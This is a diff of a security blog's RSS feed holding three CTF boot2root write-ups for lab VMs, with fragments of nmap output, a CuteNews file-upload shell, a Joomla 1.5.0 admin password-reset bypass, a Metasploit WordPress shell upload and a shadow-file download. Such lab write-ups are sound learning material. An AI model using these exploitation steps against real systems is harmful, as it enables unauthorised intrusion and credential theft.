@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Sectalks on rastamouse.me</title>
-    <link>https://rastamouse.me/tags/sectalks/</link>
-    <description>Recent content in Sectalks on rastamouse.me</description>
+    <title>sectalks on rastamouse.me</title>
+    <link>https://rastamouse.me/tags/sectalks/index.xml</link>
+    <description>Recent content in sectalks on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 16 Apr 2016 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/tags/sectalks/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
@@ -15,13 +14,11 @@
       <pubDate>Sat, 16 Apr 2016 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2016/simple/</guid>
-      <description>
-
-&lt;h3 id=&#34;simple-ctf:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Simple CTF&lt;/h3&gt;
+      <description>&lt;h3 id=&#34;simple-ctf&#34;&gt;Simple CTF&lt;/h3&gt;
 
 &lt;p&gt;Simple CTF is a boot2root that focuses on the basics of web based hacking.  /root/flag.txt is your ultimate goal.&lt;/p&gt;
 
-&lt;h3 id=&#34;hints:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Hints&lt;/h3&gt;
+&lt;h3 id=&#34;hints&#34;&gt;Hints&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Get a user shell by uploading a reverse shell and executing it.&lt;/li&gt;
@@ -29,7 +26,9 @@
 &lt;li&gt;There are 3 known privesc exploits that work. Some people have had trouble executing one of them unless it was over a reverse shell using a netcat listener.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;discovery:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Discovery&lt;/h2&gt;
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;discovery&#34;&gt;Discovery&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.104
 
@@ -39,7 +38,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Please Login / CuteNews
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;shell:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Shell&lt;/h2&gt;
+&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
 
 &lt;p&gt;CuteNews 2.0.3 has an arbitary file upload vulnerability, in the avatar function of a registered user.  I first registered an account as &lt;code&gt;rasta:mouse&lt;/code&gt; and logged in.  Navigate to &lt;code&gt;Personal options&lt;/code&gt; and select the &lt;code&gt;Browse&lt;/code&gt; button to upload an avatar.&lt;/p&gt;
 
@@ -66,7 +65,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;priv-esc:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Priv esc&lt;/h2&gt;
+&lt;h2 id=&#34;priv-esc&#34;&gt;Priv esc&lt;/h2&gt;
 
 &lt;p&gt;This VM is running Ubuntu 14.04.1, which has a kernel vulnerability that will take us straight to &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
 
@@ -92,13 +91,12 @@ sh: 0: can&#39;t access tty; job control turned off
 root
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag.txt
 U wyn teh Interwebs!!1eleven11!!1!
 Hack the planet!
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -107,22 +105,22 @@ Hack the planet!
       <pubDate>Fri, 15 Apr 2016 19:14:56 +0100</pubDate>
       
       <guid>https://rastamouse.me/writeups/2016/fuku/</guid>
-      <description>
-
-&lt;h3 id=&#34;fuku-ctf:4620d038ef80856257f87c289da6c889&#34;&gt;Fuku CTF&lt;/h3&gt;
+      <description>&lt;h3 id=&#34;fuku-ctf&#34;&gt;Fuku CTF&lt;/h3&gt;
 
 &lt;p&gt;Fuku (pronounced &amp;ldquo;far queue&amp;rdquo;) CTF is designed to fuck with people.&lt;/p&gt;
 
 &lt;p&gt;There are a few flag.txt files to grab. The final one is in the /root/ directory. However, the ultimate goal is to get a root shell.&lt;/p&gt;
 
-&lt;h3 id=&#34;scenario:4620d038ef80856257f87c289da6c889&#34;&gt;Scenario&lt;/h3&gt;
+&lt;h3 id=&#34;scenario&#34;&gt;Scenario&lt;/h3&gt;
 
 &lt;p&gt;&amp;ldquo;Bull was pissed when you broke into his Minotaur box. He has taken precautions with another website that he is hosting, implementing IDS, whitelisting, and obfuscation techniques. He is now taunting hackers to try and hack him, believing himself to be safe. It is up to you to put him in his place.&amp;rdquo;&lt;/p&gt;
 
-&lt;h3 id=&#34;hints:4620d038ef80856257f87c289da6c889&#34;&gt;Hints&lt;/h3&gt;
+&lt;h3 id=&#34;hints&#34;&gt;Hints&lt;/h3&gt;
 
 &lt;p&gt;Some scripting will probably be needed to find a useful port.
 If the machine seems to go down after a while, it probably hasn&amp;rsquo;t. This CTF isn&amp;rsquo;t called Fuku for nothing!&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;This VM was supremely fuckin annoying, as its IP address changes at regular intervals :)&lt;/p&gt;
 
@@ -217,7 +215,7 @@ total 256612
 
 &lt;p&gt;Reading the dump for port &lt;code&gt;13370&lt;/code&gt;, we can see this is an installation of Jooma.  We can hop over in a browser for confirmation, and we see a lovely Japanese Rick Roll rendition.&lt;/p&gt;
 
-&lt;h2 id=&#34;joomla:4620d038ef80856257f87c289da6c889&#34;&gt;Joomla&lt;/h2&gt;
+&lt;h2 id=&#34;joomla&#34;&gt;Joomla&lt;/h2&gt;
 
 &lt;p&gt;The version of Joomla installed is &lt;code&gt;1.5.0&lt;/code&gt;, which has a remote admin password change vulnerability.  So we can navigate to &lt;code&gt;/index.php?option=com_user&amp;amp;view=reset&amp;amp;layout=confirm&lt;/code&gt;, pop a &lt;code&gt;&#39;&lt;/code&gt; in the text box and we&amp;rsquo;re free to set any new password we wish.&lt;/p&gt;
 
@@ -248,7 +246,7 @@ haha! FUKU! Only root can run that command.
 
 &lt;p&gt;It seems there&amp;rsquo;s some limitation going on with what commands we can run, which might get interesting.&lt;/p&gt;
 
-&lt;h2 id=&#34;flag-1:4620d038ef80856257f87c289da6c889&#34;&gt;Flag 1&lt;/h2&gt;
+&lt;h2 id=&#34;flag-1&#34;&gt;Flag 1&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /var/www/html/flag.txt
 Did you find this flag by guessing? Or possibly by looking in the robots.txt file?
@@ -256,7 +254,7 @@ Maybe you found it after getting a shell, by using a command like &amp;quot;find
 Random keyboard smash: J7&amp;amp;fVbh2kTy[JgS&amp;quot;98$vF4#;&amp;gt;mGcT
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;priv-esc:4620d038ef80856257f87c289da6c889&#34;&gt;Priv Esc&lt;/h2&gt;
+&lt;h2 id=&#34;priv-esc&#34;&gt;Priv Esc&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ps aux
 root      1442  0.0  0.5   5732  2744 ?        S    04:24   0:00 /bin/bash /root/chkrootkit-0.49/run_chkrootkit
@@ -283,8 +281,7 @@ ls -l
 cat flag.txt
 Yep, this is a flag. It&#39;s worth over 9000 Internet points!
 Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&amp;amp;*iuGf)8$d4gfh%4
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -293,20 +290,20 @@ Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&amp;amp;*iuGf)8$d4gfh%4
       <pubDate>Fri, 15 Apr 2016 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2016/minotaur/</guid>
-      <description>
-
-&lt;h3 id=&#34;minotaur-ctf:130852a9ee39e601e939903b24e77be6&#34;&gt;Minotaur CTF&lt;/h3&gt;
+      <description>&lt;h3 id=&#34;minotaur-ctf&#34;&gt;Minotaur CTF&lt;/h3&gt;
 
 &lt;p&gt;Minotaur is a boot2root CTF. There are a few flag.txt files around to grab. /root/flag.txt is your ultimate goal.&lt;/p&gt;
 
-&lt;h3 id=&#34;hints:130852a9ee39e601e939903b24e77be6&#34;&gt;Hints&lt;/h3&gt;
+&lt;h3 id=&#34;hints&#34;&gt;Hints&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;This CTF has a couple of fairly heavy password cracking challenges, and some red herrings.&lt;/li&gt;
 &lt;li&gt;One password you will need is not on rockyou.txt or any other wordlist you may have out there. So you need to think of a way to generate it yourself.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;enumeration:130852a9ee39e601e939903b24e77be6&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
 
 &lt;p&gt;After spinning up the VM and doing an ARP scan, we find it at &lt;code&gt;192.168.56.223&lt;/code&gt;.  A port scan shows 3 ports available:&lt;/p&gt;
 
@@ -351,7 +348,7 @@ ID	Response   Lines      Word         Chars          Request
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;wordpress:130852a9ee39e601e939903b24e77be6&#34;&gt;Wordpress&lt;/h2&gt;
+&lt;h2 id=&#34;wordpress&#34;&gt;Wordpress&lt;/h2&gt;
 
 &lt;p&gt;&lt;code&gt;wpscan&lt;/code&gt; is my defacto tool for scanning Wordpress.  &lt;code&gt;root@kali:~# wpscan -u http://192.168.56.223/bull/&lt;/code&gt;&lt;/p&gt;
 
@@ -387,7 +384,7 @@ root@kali:~/minotaur# wc -l bulls
 
 &lt;p&gt;I manually logged in just to make sure they worked, and I also noted that this was an admin account (which was fairly predictable due to its ID).  But it does mean that we don&amp;rsquo;t actually need to exploit the Slideshow Gallery vulnerability, as we can just upload a PHP Shell via this admin panel.&lt;/p&gt;
 
-&lt;h2 id=&#34;shell:130852a9ee39e601e939903b24e77be6&#34;&gt;Shell&lt;/h2&gt;
+&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
 
 &lt;p&gt;I&amp;rsquo;ll just use the &lt;code&gt;exploit/unix/webapp/wp_admin_shell_upload&lt;/code&gt; Metasploit module for this.&lt;/p&gt;
 
@@ -410,7 +407,7 @@ OS          : Linux minotaur 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15
 Meterpreter : php/php
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag-1:130852a9ee39e601e939903b24e77be6&#34;&gt;Flag 1&lt;/h2&gt;
+&lt;h2 id=&#34;flag-1&#34;&gt;Flag 1&lt;/h2&gt;
 
 &lt;p&gt;The VM description told us that there are multiple flags, the first of which is found in the webroot.&lt;/p&gt;
 
@@ -419,7 +416,7 @@ Oh, lookey here. A flag!
 Th15 15 @N 3@5y f1@G!
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag-2:130852a9ee39e601e939903b24e77be6&#34;&gt;Flag 2&lt;/h2&gt;
+&lt;h2 id=&#34;flag-2&#34;&gt;Flag 2&lt;/h2&gt;
 
 &lt;p&gt;The second flag is found in the &lt;code&gt;/tmp&lt;/code&gt; directory, along with a priv-esc opportunity.&lt;/p&gt;
 
@@ -434,7 +431,7 @@ Also, you found a flag!
 My m1L|&amp;lt;$|-|@|&amp;lt;3 br1|\|G$ @11 t3h b0y$ 2 t3h y@R|)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;root:130852a9ee39e601e939903b24e77be6&#34;&gt;root&lt;/h2&gt;
+&lt;h2 id=&#34;root&#34;&gt;root&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; download /tmp/shadow.bak
 [*] downloading: /tmp/shadow.bak -&amp;gt; shadow.bak
@@ -496,7 +493,7 @@ minotaur@minotaur:~$ sudo -i
 root@minotaur:~# 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;final-flag:130852a9ee39e601e939903b24e77be6&#34;&gt;Final Flag&lt;/h2&gt;
+&lt;h2 id=&#34;final-flag&#34;&gt;Final Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@minotaur:~# ls -l
 -rw------- 1 root root   70 May 27  2015 flag.txt
@@ -506,8 +503,7 @@ drwxr-xr-x 4 root root 4096 May 27  2015 peda
 root@minotaur:~# cat flag.txt 
 Congrats! You got the final flag!
 Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
   </channel>
